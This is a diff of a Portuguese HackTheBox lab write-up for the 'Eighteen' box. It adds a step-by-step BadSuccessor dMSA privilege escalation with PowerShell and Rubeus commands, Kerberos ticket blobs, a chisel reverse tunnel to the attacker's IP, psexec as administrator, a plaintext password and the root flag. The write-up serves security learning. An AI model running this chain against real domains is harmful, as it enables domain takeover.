@@ -341,7 +341,7 @@ WINRM       10.129.15.27    5985   DC01             [-] eighteen.htb\dave.green:
 
 Usei a ferramenta `evil-winrm` para logar como `adam.scott` no servidor. A flag do usuário pode ser encontrada na pasta **Desktop** desse usuário.
 
-```bash {23}
+```powershell {23}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Eighteen]
 └─$ evil-winrm -i eighteen.htb -u 'adam.scott' -p 'iloveyou1'
 
@@ -377,7 +377,7 @@ descrever os passos até chegar no badsuccessor.
 
 Depois de conquistar a flag de usuário, acabei gastando algumas horas enumerando sem encontrar nada relevante. No entanto, algumas informações encontradas eram bem importantes. Por exemplo, a porta **88** [[KERBEROS]] estava aberta na rede local, o que me permitiria fazer ataques envolvendo esse serviço. No scan inicial do `Nmap`, essa e outras portas não estavam disponíveis externamente.
 
-```bash {3}
+```powershell {3}
 *Evil-WinRM* PS C:\Users\adam.scott\Documents> netstat -ano | findstr "LISTENING"
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
   TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       820
@@ -396,7 +396,7 @@ Depois de conquistar a flag de usuário, acabei gastando algumas horas enumerand
 
 Outra informação importante é que a máquina era um `Windows Server 2025`.
 
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\adam.scott\Documents> Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
 
 dnshostname       name operatingsystem
@@ -407,13 +407,259 @@ DC01.eighteen.htb DC01 Windows Server 2025 Datacenter
 Pesquisando sobre vulnerabilidades recentes nessa versão do Windows, encontrei a `CVE2025-53779`, também conhecida como `Badsuccessor` .
 
 >[!question] O que é a vulnerabilidade BadSuccessor?
->Explique a vuln
+>**BadSuccessor** é uma vulnerabilidade crítica de escalonamento de privilégios no Windows Server 2025 que permite a invasores comprometer todo o domínio Active Directory. Ao explorar o recurso **Delegated Managed Service Account (dMSA)**, usuários com baixos privilégios podem simular a migração de contas, assumindo controle de administradores de domínio.
+
+Para que esse tipo de ataque dê certo, o usuário `adam.scott` precisaria ter permissões de *CreateChild* em qualquer Unidade Organizacional (OU). Usando um [script](
+https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1) do Github, eu verifiquei se era possível fazer esse ataque.
+
+```powershell {12}
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> upload Get-BadSuccessorOUPermissions.ps1
+
+Info: Uploading /home/kali/Boxes/Hackthebox/Easy/Eighteen/Get-BadSuccessorOUPermissions.ps1 to C:\Users\adam.scott\Documents\Get-BadSuccessorOUPermissions.ps1
+
+Data: 6144 bytes of 6144 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> ./Get-BadSuccessorOUPermissions.ps1
+
+Identity    OUs
+--------    ---
+EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
+```
+
+O vetor de ataque estava claro naquele momento. Conquistar o `administrator` da máquina era só questão de tempo.
 ### Shell como Administrator
 
-Acesso remoto e flag do root
+>[!note] **O problema da versão**
+>Para conseguir explorar a falha, tudo o que você precisa é de um script como o [Badsuccessor.ps1](https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1) e de uma versão atualizada da ferramenta `Rubeus`.
+>Nessa máquina eu precisei fazer cada comando manualmente, para poder descobrir que a versão do `Rubeus` que eu estava usando não estava atualizada para esse tipo de ataque. Outro problema é que eu não tinha como compilar o `Rubeus` na minha vm, o que me frustrou bastante. Felizmente surgiu uma maneira de explorar sem precisar compilar, usando o script [Invoke-Rubeus.ps1](https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/Invoke-Rubeus.ps1).
+
+Para a exploração, eu segui os passos do blog da [Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory):
+
+1. Criei um computador vulnerável.
+
+```powershell
+*Evil-WinRM* PS C:\temp> New-ADComputer -Name PwnedMachine `
+    -SamAccountName "PwnedMachine$" `
+    -AccountPassword (ConvertTo-SecureString -String "Passw0rd@123456" -AsPlainText -Force) `
+    -Enabled $true `
+    -Path "ou=Staff,dc=eighteen,dc=htb" `
+    -PassThru `
+    -Server "DC01.eighteen.htb"
+
+
+DistinguishedName : CN=PwnedMachine,ou=Staff,dc=eighteen,dc=htb
+DNSHostName       :
+Enabled           : True
+Name              : PwnedMachine
+ObjectClass       : computer
+ObjectGUID        : 630635e3-c269-4a8b-a5c8-d241a8fae75a
+SamAccountName    : PwnedMachine$
+SID               : S-1-5-21-1152179935-589108180-1989892463-12124
+UserPrincipalName :
+```
+
+2. Usei o `Rubeus` para gerar um hash `AES256` da senha do computador criado.
+
+```powershell {22}
+*Evil-WinRM* PS C:\temp> Import-Module ./Invoke-RubeusPR.ps1
+*Evil-WinRM* PS C:\temp> Invoke-Rubeus -Command "hash /password:Passw0rd@123456 /user:PwnedMachine$ /domain:eighteen.htb"
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Passw0rd@123456
+[*] Input username             : PwnedMachine$
+[*] Input domain               : eighteen.htb
+[*] Salt                       : EIGHTEEN.HTBhostpwnedmachine.eighteen.htb
+[*]       rc4_hmac             : 7C7FD1A99C88C4BA15B346D3606699AB
+[*]       aes128_cts_hmac_sha1 : F063E3CD210F9D49CED113BFC6E2FABF
+[*]       aes256_cts_hmac_sha1 : CB2E3E47867B440174D72E62EB12000A630ED1EFF3C7D2DC2777ED35F58E6A0B
+[*]       des_cbc_md5          : 20510DE076349861
+```
+
+3. Criei um **dMSA** que vai impersonar o `administrator`.
+
+```powershell
+*Evil-WinRM* PS C:\temp> New-ADServiceAccount -Name "Pwned_DMSA2" `
+    -DNSHostName "eighteen.htb" `
+    -CreateDelegatedServiceAccount `
+    -PrincipalsAllowedToRetrieveManagedPassword "PwnedMachine$" `
+    -Path "ou=Staff,dc=eighteen,dc=htb" `
+```
+
+```powershell
+$sid = (Get-ADUser -Identity "adam.scott").SID
+$acl = Get-Acl "AD:\CN=Pwned_DMSA2,ou=Staff,dc=eighteen,dc=htb"
+$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
+$acl.AddAccessRule($rule)
+Set-Acl -Path "AD:\CN=Pwned_DMSA2,ou=Staff,dc=eighteen,dc=htb" -AclObject $acl
+```
+
+4. Mudei os valores de `msDS-ManagedAccountPrecededByLink` e `msDS-DelegatedMSAState`
+
+```powershell
+*Evil-WinRM* PS C:\temp> Set-ADServiceAccount -Identity Pwned_DMSA2 -Replace @{
+    'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
+    'msDS-DelegatedMSAState' = 2
+}
+```
+
+5. Gerei um ticket `TGT` usando o `Rubeus`. Isso me deu um ticket do `administrador`.
+
+```powershell {26}
+*Evil-WinRM* PS C:\temp> Invoke-Rubeus -Command "asktgs /targetuser:Pwned_DMSA2$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /ptt /ticket:doIFxDCCBcCgAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEfDCCBHigAwIBEqEDAgECooIEagSCBGZ4FNcNA2F6v05tazUBAHPIU4oa/wBuHuYv5bmWa1tvYNVGR75WgHZABxpBfmGEvWePDhlMxu8JIX81pqkycPfCBY0tqs2H87SyqB1S5GNotExbfPIYIxsYtNlc0B7D2mkTc4bShT1L/ftdCVvme/XbSs47KWhqoMg3bEeiOS+MVPQcKI1auFDNvr1rb40ZpqVnnLScisBXCeTxGiVsq9Oz+aOK+NNG5u5MvwBUqOVguDSxaWlzKTGPrcDtJC95KT87GBupZmpukh9a452NyQA3TwlE/ZxYVW8ZuUxjhBZ+B/oKkFqDdeGOjLIvIoYiX77frx/O8Vt62FW1zwXxDBa4ilLh7AvkWF5M3ke4+9b2nYqm5/zFOXA1a+Y62xkZcF4MW9bTjfuu1JF3BVL3AcqMG+eA2bPx1cxD3PFpWQARa+9m3wkToIzOqwUuNxGODaXutTX/ifzXKF6coFydJigjZb/I39NK7Au2eZF3v1r5QoVwhdGejzlnLhzVOcsRspOirtBkOiu56/+EnMF9UpGQkEMRJFLhFie8kESYFbZrwaJJsHucK7sX9PvUbIg61a87miPS4yvdBaZirUTJb0Qrx+McL96qPOCJBg+gweEjdIjR4HalcRQUpUr7cbljOQkl2BhC3SwdSP25Medt00jdQKH+RGf78vQpCPM9vHUP8Fmz1QIAZoAetWLCbm5ZtUTYj9fwn7yNljBjiZAOlGWBHrDv90c1TLNeikLvdGbUJIy72A6frX4DTFRIwZW+lMYEVtDuWpEPihKIax7IOQbadxkoWz3sq2FepxlRB55RyOL/mSpMqYiul1IsEo7qe3poozeco9HkTal/FPYL57SZiW7ud4z9R6GJU0UAqkAFdN8ObjathhCH4zEq7reaFCT2yEutWRir4ZxmwuixqSYj88lok01SO356kCqoGyAoN35G+qZtYQWUn0ITviJZlWpUwYvF2LqXo6HCDQG2I3ahoGQLKyHCwYFXXkly9tKhCGfWFIvbdjjwxXCTw4GtWtWayNl0lK7IED875pPLBPbAo8/PdkA1gY+UpwWXEgRacssSMsH3RzzaV2YvzWjy6uo2hmYu0SIp7lWTLJtfiCR4hxWLRpm1m0C1ukvjBcBCc5ctgV6XfBDH/dl88dqVXR5QCr+M1XK3jDF7XFiM+aVABEPXzcbX4OwhKIGawVJjZ07SXu5DJup8RjAXsKnOY69DN25wh0MsAUcDVgbNPH+BgEWJKXOUuUxJkNM0dUriEYjhP+lCggf4von/Z9c6Zob+Cb66kXKYzqgPMYochMEvKRJhMD8ufUypU/FDtfQqW5pBx3zALN/MXbibs+TT70obcTaOZSOZfuzyB57RMsfeIqx5ojbLViMSYY+8yKy4WTg5kt28WzTB0hr3aIv9eeBLi9M9y/iwq2EPDVF5Cw/pF23rdLWf6IS0TQyqvl+Gx98r9rRQjdwLbg9dDy7mUemeabfF1QexfjLiY2vzvhJkxygjRUCMo4HrMIHooAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQgFy8KbCmL4DpDmgOzWpqo1ndkrHpbBlm6sRKM3YxWkFihDhsMRUlHSFRFRU4uSFRCohowGKADAgEBoREwDxsNUHduZWRNYWNoaW5lJKMHAwUAQOEAAKURGA8yMDI1MTEyMjIxMjQyNFqmERgPMjAyNTExMjMwNzI0MjRapxEYDzIwMjUxMTI5MjEyNDI0WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGVpZ2h0ZWVuLmh0Yg== /outfile:c:/temp/admin.kirbi"
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building DMSA TGS-REQ request for 'Pwned_DMSA2$' from 'PwnedMachine$'
+[+] Sequence number is: 1848416245
+[*] Using domain controller: DC01.eighteen.htb (fe80::ab83:e06c:33af:2b87%3)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/EIGHTEEN.HTB
+  ServiceRealm             :  EIGHTEEN.HTB
+  UserName                 :  Pwned_DMSA2$ (NT_PRINCIPAL)
+  UserRealm                :  eighteen.htb
+  StartTime                :  11/22/2025 1:34:28 PM
+  EndTime                  :  11/22/2025 1:49:28 PM
+  RenewTill                :  11/29/2025 1:24:24 PM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  FFUVHRmjCBy0sKAuel8pIj7kn4vFgWbkRryPnEXDVak=
+  Current Keys for Pwned_DMSA2$: (aes256_cts_hmac_sha1) 66DC0F9A0765D703108EE22BAAF74D5E3BD12599F722BEA18091B1DC8AA0C098
+
+
+Exception: Access to the path 'C:\WINDOWS\system32\c_temp_admin.kirbi' is denied.
+
+*Evil-WinRM* PS C:\temp> download admin.kirbi
+
+Info: Downloading C:\temp\admin.kirbi to admin.kirbi
+
+Info: Download successful!
+*Evil-WinRM* PS C:\temp>
+```
+
+Para acessar remotamente usei as ferramentas `Chisel` e `Proxychains`. Primeiro criei um servidor proxy com `Chisel`.
 
 ```bash
-echo "Exemplo de comando"
+──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Eighteen]
+└─$ chisel server -p 8000 --reverse --socks5
+2025/11/22 11:41:56 server: Reverse tunnelling enabled
+2025/11/22 11:41:56 server: Fingerprint 8Ncd7HNGA/RbS34OWhcq1KTT8bBsxbhrKtFSURemu+I=
+2025/11/22 11:41:56 server: Listening on http://0.0.0.0:8000
+2025/11/22 11:44:21 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
+2025/11/22 11:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+Daí upei o executável `chisel.exe` para o servidor Windows e criei um túnel para o servidor proxy na minha máquina.
+
+```powershell {8}
+*Evil-WinRM* PS C:\temp> upload chisel.exe
+
+Info: Uploading /home/kali/Boxes/Hackthebox/Easy/Eighteen/tools/chisel.exe to C:\temp\chisel.exe
+
+Data: 14149632 bytes of 14149632 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\temp> .\chisel.exe client 10.10.15.142:8000 R:socks
+chisel.exe : 2025/11/22 13:44:25 client: Connecting to ws://10.10.15.142:8000
+    + CategoryInfo          : NotSpecified: (2025/11/22 13:4....10.15.142:8000:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2025/11/22 13:44:31 client: Connected (Latency 232.9629ms)
+```
+
+Usando a ferramenta `impacket-ticketConverter`, converti o ticket `admin.kirbi` para `admin.ccache`.
+
+```bash
+┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Eighteen/tools]
+└─$ impacket-ticketConverter admin.kirbi admin.ccache
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] converting kirbi to ccache...
+[+] done
+```
+
+Para finalizar, usei a ferramenta `impacket-psexec` juntamente com a ferramenta `proxychains` para acessar o servidor Windows como `administrator`.
+
+```bash
+┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Eighteen/tools]
+└─$ export KRB5CCNAME=admin.ccache
+
+
+┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Eighteen/tools]
+└─$ proxychains4 faketime -f +7h impacket-psexec -k -no-pass 'eighteen.htb/Pwned_DMSA2$'@dc01.eighteen.htb
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+[*] Requesting shares on dc01.eighteen.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file NTixXaAJ.exe
+[*] Opening SVCManager on dc01.eighteen.htb.....
+[*] Creating service drJV on dc01.eighteen.htb.....
+[*] Starting service drJV.....
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
+[!] Press help for extra shell commands
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+Microsoft Windows [Version 10.0.26100.4349]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\System32>
+```
+
+Com isso fui capaz de pegar a flag do root.
+
+```powershell {16}
+C:\Windows\System32> cd c:/users/administrator/desktop
+
+c:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is E154-392A
+
+ Directory of c:\Users\Administrator\Desktop
+
+11/10/2025  04:39 PM    <DIR>          .
+11/10/2025  02:15 PM    <DIR>          ..
+11/22/2025  06:20 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,218,671,104 bytes free
+
+c:\Users\Administrator\Desktop> type root.txt
+5252a5ad4932cd664ed04b3962486cc7
 ```
 
 ---
@@ -422,25 +668,15 @@ echo "Exemplo de comando"
 
 ![[EighteenFinal.png| Mesm imagem do banner inicial, porém abaixo está escrito: Eighteen has been pwned.]]
 
-Palavras finais sobre o que aprendeu e CTA.
+Nessa máquina aprendi algumas coisas bem legais, por exemplo, como escalar privilégios no **MSSQL** . Além disso aprendi que, mesmo usando uma criptografia forte, é possível quebrar se a senha for fraca. Por fim aprendi que é muito importante ter as ferramentas atualizadas para poder explorar os ataques e técnicas mais recentes.
 
 ```mermaid
 flowchart TD
 	subgraph acesso inicial
-    A(acesso inicial) -->|CVE-2025-xxxx| B(www-data) 
-    B -->|db.php| C(user1)
+    A(Mssql user Kevin) -->|impersonate| B(appdev) 
     end
+    B -->|admin hash| C(adam.scott)
     subgraph escalação de privilegios
-    C -->|exploit.sh| D(root)
-    C -->|portforward| E[web as root]
-    E -->|command execution| D(root)
+    C -->|BadSuccessor| D(administrator)
     end
-```
-
-Você pode usar links internos: [[outra-nota]]
-E inserir imagens: ![[imagem.png | descrição da imagem]]
-Ou blocos de código:
-
-```bash
-echo "Exemplo de comando"
 ```
